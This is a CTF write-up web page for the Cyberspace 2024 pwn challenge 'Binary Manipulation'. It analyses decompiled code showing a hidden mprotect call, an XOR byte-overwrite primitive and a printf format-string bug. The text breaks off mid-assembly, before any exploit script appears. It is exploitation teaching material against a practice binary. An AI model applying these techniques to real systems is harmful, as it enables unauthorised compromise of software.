@@ -1,0 +1,1212 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml"  xml:lang="en-us" lang="en-us" >
+
+<head>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.19376a73756a32b5aba91ad145ae75960d5f0bc999eb3f100b6b4e912b707015.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Playwrite+CU:wght@100..400&display=swap" rel="stylesheet">
+
+    
+    <link rel="icon" href=/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">Civiled - Cyberspace 2024</title>
+<meta property="og:title" content=Civiled&#32;-&#32;Cyberspace&#32;2024 />
+<meta name="twitter:title" content=Civiled&#32;-&#32;Cyberspace&#32;2024 />
+<meta itemprop="name" content=Civiled&#32;-&#32;Cyberspace&#32;2024 />
+<meta name="application-name" content=Civiled&#32;-&#32;Cyberspace&#32;2024 />
+<meta property="og:site_name" content="Civiled" />
+
+
+<meta name="description" content="Cyberspace 2024 CTF Writeups | Pwn" />
+<meta itemprop="description" content="Cyberspace 2024 CTF Writeups | Pwn" />
+<meta property="og:description" content="Cyberspace 2024 CTF Writeups | Pwn" />
+<meta name="twitter:description" content="Cyberspace 2024 CTF Writeups | Pwn" />
+
+
+<base href="https://civiled.io/writeups/cyberspace/" />
+<link rel="canonical" href="https://civiled.io/writeups/cyberspace/" itemprop="url" />
+<meta name="url" content="https://civiled.io/writeups/cyberspace/" />
+<meta name="twitter:url" content="https://civiled.io/writeups/cyberspace/" />
+<meta property="og:url" content="https://civiled.io/writeups/cyberspace/" />
+
+
+<meta property="og:updated_time" content="2024-09-02T00:00:00Z" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='https://civiled.io/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+
+  
+    <meta name="twitter:site" content="@josh_gallas" />
+    <meta name="twitter:creator" content="@josh_gallas" />
+
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="Civiled" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.92.2" />
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.263097e8bc0533444eb85a324663ec769631b90133f16622f641d5b511934728.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #d12f24;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5a5a5a;
+        --link-color: #268bd2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #fff;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #d12f24;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #d12f24;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="https://civiled.io/">
+                <img src="/images/logo.png" alt="brand image">
+            </a>
+        
+        
+            <a href="https://civiled.io/">
+                <h1 class="brand-name">Civiled</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/notes/">Notes</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/writeups/">Writeups</a>
+                    </li>
+                    
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/blogs/">Blogs</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        <div class="social-holder">
+    
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/CiviledCode">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor"
+                d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z" />
+        </svg>
+    </a>
+    
+    
+    
+    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/joshua-gallas-a934b0201/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor"
+                d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z" />
+        </svg>
+    </a>
+    
+    
+    
+    <a target="_blank" class="social" title="X" href="https://x.com/josh_gallas">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.1em" height="1.1em" viewBox="0 0 512 472.799">
+            <path fill="currentColor"
+                d="M403.229 0h78.506L310.219 196.04 512 462.799H354.002L230.261 301.007 88.669 462.799h-78.56l183.455-209.683L0 0h161.999l111.856 147.88L403.229 0zm-27.556 415.805h43.505L138.363 44.527h-46.68l283.99 371.278z" />
+        </svg>
+    </a>
+    
+    
+    
+    
+    
+    <a target="_blank" class="social" title="Discord" href="https://discordapp.com/users/337082914124726282">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor"
+                d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z" />
+        </svg>
+    </a>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <a target="_blank" class="social" title="Email" href="mailto://civiled@usa.com">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor"
+                d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z" />
+        </svg>
+    </a>
+    
+    
+    
+</div>
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | forked from <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="https://civiled.io/writeups/cyberspace/">Cyberspace 2024</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2024-09-02T00:00:00Z" class="post-date">
+        September 2, 2024
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>16 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-pwn">
+        <a href="https://civiled.io/tags/pwn">pwn</a>
+      </li>
+      
+      <li class="tag-rop">
+        <a href="https://civiled.io/tags/rop">rop</a>
+      </li>
+      
+      <li class="tag-printf">
+        <a href="https://civiled.io/tags/printf">printf</a>
+      </li>
+      
+      <li class="tag-shellcoding">
+        <a href="https://civiled.io/tags/shellcoding">shellcoding</a>
+      </li>
+      
+      <li class="tag-prng">
+        <a href="https://civiled.io/tags/prng">prng</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <h2 id="binary-manipulation">Binary Manipulation</h2>
+<p>I&rsquo;m given a binary &ldquo;chal&rdquo; with the following protections:</p>
+<ul>
+<li>Arch:     amd64-64-little</li>
+<li>RELRO:    Partial RELRO</li>
+<li>Stack:    Canary found</li>
+<li>NX:       NX enabled</li>
+<li>PIE:      No PIE (0x400000)</li>
+</ul>
+<p>Initially I held on to the assumption that shellcoding wouldn&rsquo;t be possible due to NX being enabled. This would prove to be a problem later on. Luckily PIE was disabled so it&rsquo;d be easy to setup debug scripts to break at static locations and I won&rsquo;t have to rely on a memory leak if I want to begin with ROP.</p>
+<p>Opening the binary in Ghidra yields the following for the <code>main</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">undefined8 <span style="color:#a6e22e">main</span>(EVP_PKEY_CTX <span style="color:#f92672">*</span>param_1)
+
+{
+  init(param_1);
+  vuln();
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>I see that there&rsquo;s clearly a <code>vuln</code> function where the vulnerability is going to lie and an <code>init</code>. Let&rsquo;s start with the latter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">init</span>(EVP_PKEY_CTX <span style="color:#f92672">*</span>ctx)
+
+{
+  <span style="color:#66d9ef">int</span> iVar1;
+  
+  syscall();
+  setvbuf(stdout,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
+  setvbuf(stdin,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
+  iVar1 <span style="color:#f92672">=</span> setvbuf(stderr,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>);
+  <span style="color:#66d9ef">return</span> iVar1;
+}
+</code></pre></div>
+
+
+
+
+<div class="tabs-container">
+    <div class="tabs" role="tablist">
+
+	    
+        
+            
+            <button class="tab active" id="ceabdf">
+            
+
+                init Breakdown
+            </button>
+
+	    
+        
+            
+            <button class="tab" id="befdac">
+            
+
+                What I missed
+            </button>
+
+	    
+
+    </div>
+
+    
+    
+        
+            <div class="tabcontent ceabdf" style="display:block;">
+        
+
+        <p>Everything looked pretty standard with the <code>setvbuf</code> function calls. Typically challenges will use this function to set the buffering mode of IO to <code>IONBF</code>, which is unbuffered mode. This means that content will not be buffered and will be immediately available to the program, removing the delays caused by buffering. <em>I didn&rsquo;t look too much into the syscall.</em></p>
+
+        
+        
+    </div>
+    
+    
+        
+            <div class="tabcontent befdac">
+        
+
+        <p>Now that we&rsquo;ve solved the challenge and gone back it was apparent what we had overlooked. Below is the assembly for the <code>init</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">ENDBR64</span>
+<span style="color:#a6e22e">PUSH</span>       <span style="color:#66d9ef">RBP</span>
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">RBP</span>,<span style="color:#66d9ef">RSP</span>
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">RAX</span>,<span style="color:#ae81ff">0xa</span>
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">ctx</span>,<span style="color:#66d9ef">_init</span>
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">RSI</span>,<span style="color:#ae81ff">0x1000</span>
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">RDX</span>,<span style="color:#ae81ff">0x7</span>
+<span style="color:#a6e22e">SYSCALL</span>
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">RAX</span>,<span style="color:#66d9ef">qword</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">stdout</span>]
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">ECX</span>,<span style="color:#ae81ff">0x0</span>
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">EDX</span>,<span style="color:#ae81ff">0x2</span>
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">ESI</span>,<span style="color:#ae81ff">0x0</span>
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">ctx</span>,<span style="color:#66d9ef">RAX</span>
+<span style="color:#a6e22e">CALL</span>       <span style="color:#66d9ef">libc.so.6</span>::<span style="color:#66d9ef">setvbuf</span>                               <span style="color:#66d9ef">int</span> <span style="color:#66d9ef">setvbuf</span>
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">RAX</span>,<span style="color:#66d9ef">qword</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">stdin</span>]
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">ECX</span>,<span style="color:#ae81ff">0x0</span>
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">EDX</span>,<span style="color:#ae81ff">0x2</span>
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">ESI</span>,<span style="color:#ae81ff">0x0</span>
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">ctx</span>,<span style="color:#66d9ef">RAX</span>
+<span style="color:#a6e22e">CALL</span>       <span style="color:#66d9ef">libc.so.6</span>::<span style="color:#66d9ef">setvbuf</span>                               <span style="color:#66d9ef">int</span> <span style="color:#66d9ef">setvbuf</span>
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">RAX</span>,<span style="color:#66d9ef">qword</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">stderr</span>]
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">ECX</span>,<span style="color:#ae81ff">0x0</span>
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">EDX</span>,<span style="color:#ae81ff">0x2</span>
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">ESI</span>,<span style="color:#ae81ff">0x0</span>
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">ctx</span>,<span style="color:#66d9ef">RAX</span>
+<span style="color:#a6e22e">CALL</span>       <span style="color:#66d9ef">libc.so.6</span>::<span style="color:#66d9ef">setvbuf</span>                               <span style="color:#66d9ef">int</span> <span style="color:#66d9ef">setvbuf</span>
+<span style="color:#a6e22e">NOP</span>
+<span style="color:#a6e22e">POP</span>        <span style="color:#66d9ef">RBP</span>
+<span style="color:#a6e22e">RET</span>
+</code></pre></div><p>Well it&rsquo;s clear that the syscall is actually pretty important. The syscall <code>0xa</code> actually corresponds to <a href="https://man7.org/linux/man-pages/man2/mprotect.2.html" target="_blank">mprotect</a>. I have since explained better in my <a href="https://civiled.io/notes/shellcode/" target="_blank">shellcoding notes</a> about this syscall and how it opens the door to shellcoding.</p>
+<p>The syscall corresponds to the following function call:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">mprotect(init, <span style="color:#ae81ff">0x1000</span>, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE<span style="color:#f92672">|</span>PROT_EXEC);
+</code></pre></div><p>This will set <code>0x1000</code> bytes starting at the function <code>init</code> to be <code>RWX</code>.</p>
+
+        
+        
+    </div>
+    
+</div>
+
+<p>The next function to look at is the <code>vuln</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">undefined8 <span style="color:#a6e22e">vuln</span>(<span style="color:#66d9ef">void</span>)
+
+{
+  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
+  undefined8 uStack_58;
+  byte local_4c [<span style="color:#ae81ff">4</span>];
+  uint local_48;
+  uint local_44;
+  undefined8 local_40;
+  <span style="color:#66d9ef">char</span> local_38 [<span style="color:#ae81ff">40</span>];
+  <span style="color:#66d9ef">long</span> local_10;
+  
+  local_10 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
+  local_40 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  puts(<span style="color:#e6db74">&#34;which stack position do you want to use?&#34;</span>);
+  __isoc99_scanf(<span style="color:#f92672">&amp;</span>DAT_004020c9,<span style="color:#f92672">&amp;</span>local_44);
+  local_44 <span style="color:#f92672">=</span> local_44 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">3</span>;
+  local_40 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)<span style="color:#f92672">&amp;</span>uStack_58 <span style="color:#f92672">+</span> (ulong)local_44);
+  puts(<span style="color:#e6db74">&#34;you have one chance to modify a byte by xor.&#34;</span>);
+  puts(<span style="color:#e6db74">&#34;Byte Index?&#34;</span>);
+  __isoc99_scanf(<span style="color:#f92672">&amp;</span>DAT_004020c9,<span style="color:#f92672">&amp;</span>local_48);
+  <span style="color:#66d9ef">if</span> (((<span style="color:#66d9ef">int</span>)local_48 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> (<span style="color:#ae81ff">7</span> <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">int</span>)local_48)) {
+    puts(<span style="color:#e6db74">&#34;don</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">t cheat!&#34;</span>);
+    FUN_00401120(<span style="color:#ae81ff">0</span>);
+  }
+  puts(<span style="color:#e6db74">&#34;xor with?&#34;</span>);
+  __isoc99_scanf(<span style="color:#f92672">&amp;</span>DAT_004020c9,local_4c);
+  local_38[(ulong)local_48 <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> local_38[(ulong)local_48 <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>] <span style="color:#f92672">^</span> local_4c[<span style="color:#ae81ff">0</span>];
+  puts(<span style="color:#e6db74">&#34;finally, do you have any feedback? it will surely help us improve our service.&#34;</span>);
+  __isoc99_scanf(<span style="color:#e6db74">&#34;%20[^@]&#34;</span>,local_38);
+  printf(local_38);
+  bye();
+  <span style="color:#66d9ef">if</span> (local_10 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
+                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+    __stack_chk_fail();
+  }
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>So what this function does is reads in an integer I&rsquo;ll call <code>X</code>. This integer is shifted left 3 bits which is essentially multplying it by 8. Then this value is added to the current RSP value, giving a pointer to a location where the value is duplicated into <code>local_40</code> or what I&rsquo;ll refer to as the &ldquo;copy buffer&rdquo;. Now that the value is in that location, 1 out of the 8 bytes can be XOR with any byte value we&rsquo;d like, allowing us to convert that byte into any value.</p>
+<p>Assuming that <code>A</code> is the original byte value and <code>B</code> is the value we want it to become, we can find the value <code>C</code> that fulfills <code>A ^ C = B</code> by doing <code>A ^ B = C</code> e.g:</p>
+<pre tabindex="0"><code>24 ^ X = 67
+24 ^ 67 = X
+X = 91
+</code></pre><p>Once the new value is within the copy buffer, we have a <code>printf</code> vulnerability:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">__isoc99_scanf(<span style="color:#e6db74">&#34;%20[^@]&#34;</span>,local_38);
+printf(local_38);
+</code></pre></div><p>The caviat here is we only have 20 characters to work with and the character <code>@</code> is blacklisted which is unfortunately <code>0x40</code>. This would make it impossible to place an address on the stack pointing anywhere with a static location within <code>.text</code> considering the base address was <code>0x400000</code>.</p>
+<p>Immediately after this the <code>bye</code> function is called:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
+undefined8 <span style="color:#a6e22e">bye</span>(<span style="color:#66d9ef">void</span>)
+
+{
+  FILE <span style="color:#f92672">*</span>__stream;
+  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
+  <span style="color:#66d9ef">char</span> acStack_50 [<span style="color:#ae81ff">56</span>];
+  <span style="color:#66d9ef">long</span> lStack_18;
+  code <span style="color:#f92672">*</span>pcStack_10;
+  
+  pcStack_10 <span style="color:#f92672">=</span> (code <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x4012b0</span>;
+  puts(<span style="color:#e6db74">&#34;Thanks for modifying the byte, goodbye.&#34;</span>);
+  pcStack_10 <span style="color:#f92672">=</span> win;
+  FUN_00401120(<span style="color:#ae81ff">0</span>);
+  lStack_18 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
+  pcStack_10 <span style="color:#f92672">=</span> (code <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>stack0xfffffffffffffff8;
+  __stream <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
+  <span style="color:#66d9ef">if</span> (__stream <span style="color:#f92672">==</span> (FILE <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
+    puts(<span style="color:#e6db74">&#34;flag.txt not found!&#34;</span>);
+    FUN_00401120(<span style="color:#ae81ff">0</span>);
+  }
+  fgets(acStack_50,<span style="color:#ae81ff">0x32</span>,__stream);
+  puts(acStack_50);
+  puts(<span style="color:#e6db74">&#34;How could you do that?!&#34;</span>);
+  puts(<span style="color:#e6db74">&#34;That</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s my precious secret.&#34;</span>);
+  puts(<span style="color:#e6db74">&#34;Anyway congratulations&#34;</span>);
+  <span style="color:#66d9ef">if</span> (lStack_18 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
+                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+    __stack_chk_fail();
+  }
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p><strong>What??</strong>
+Why is there win logic in here? This code isn&rsquo;t hit when we run normally. Looking into the assembly tells the full story:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">undefined</span> <span style="color:#66d9ef">bye</span>():  
+<span style="color:#66d9ef">ENDBR64</span>
+<span style="color:#a6e22e">PUSH</span>       <span style="color:#66d9ef">RBP</span>
+<span style="color:#a6e22e">MOV</span>        <span style="color:#66d9ef">RBP</span>,<span style="color:#66d9ef">RSP</span>
+<span style="color:#a6e22e">LEA</span>        <span style="color:#66d9ef">RAX</span>,[<span style="color:#66d9ef">s_Thanks_for_modifying_the_byte</span>,<span style="color:#66d9ef">_g_004020</span>   <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#66d9ef">Thanks</span> <span style="color:#66d9ef">for</span> 
